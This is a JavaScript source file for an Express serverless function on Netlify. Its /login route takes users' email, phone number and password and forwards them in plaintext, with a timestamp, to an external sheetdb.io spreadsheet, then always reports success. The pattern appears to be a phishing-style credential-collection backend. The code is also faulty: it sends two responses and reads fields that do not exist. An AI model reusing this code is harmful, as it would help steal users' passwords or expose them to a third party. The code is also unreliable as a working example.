const express = require('express');
const serverless = require('serverless-http');
const cors = require('cors'); // Import the CORS middleware
const app = express();
const axios = require('axios');
const baseUrl = '/.netlify/functions/expressFunction';
// Use the CORS middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));


app.get(baseUrl, (req, res) => {
    res.json({ message: 'Hello from Netlify function with Express.js!' });
});

app.get(baseUrl + "/random-number", (req, res) => {
    let random = Math.floor(Math.random() * 100);
    res.json({ message: `Random number: ${random}` });
});

app.post(baseUrl + "/register", (req, res) => {
    const data = req.body;
    const name = data.name;
    const email = data.email;
    console.log(data);
    res.json({
        message: `User ${name} with email ${email} registered`
    });
});


app.post(baseUrl + "/login", (req, res) => {
    const data = req.body;
    data.timestamp = new Date().getTime();
    const email = data.email;
    const tel = data.tel;
    const password = data.password;

    axios.post('https://sheetdb.io/api/v1/b26an47qz0cay', data)
        .then(response => {
            res.json({
                message: `Email: ${response.email} Tel: ${response.tel} Password: ${response.password} logged in`
            });
        })
        .catch(error => {
            res.json({
                message: `${error}`
            });
        });

    res.json({
        message: `Success`
    });
});

// Export the handler function
module.exports.handler = serverless(app);
